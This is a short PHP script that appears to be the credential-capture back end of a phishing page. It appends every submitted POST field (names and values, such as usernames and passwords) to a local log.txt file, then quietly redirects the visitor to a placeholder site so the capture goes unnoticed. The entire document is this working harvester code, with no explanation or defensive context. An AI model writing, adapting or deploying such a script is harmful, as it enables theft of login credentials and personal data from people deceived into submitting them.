<?php
header("Location: https://www.your-redirect.com");
$file = fopen("log.txt", "a");
fwrite($file, " ");
fwrite($file, "\r\n");
foreach($_POST as $key=>$value) { 
fwrite($file, " ");
fwrite($file, $key);
fwrite($file, "=");
fwrite($file, $value);
fwrite($file, " ");
}
fwrite($file, " ");
fwrite($file, " ");
fclose($file);
die();
?>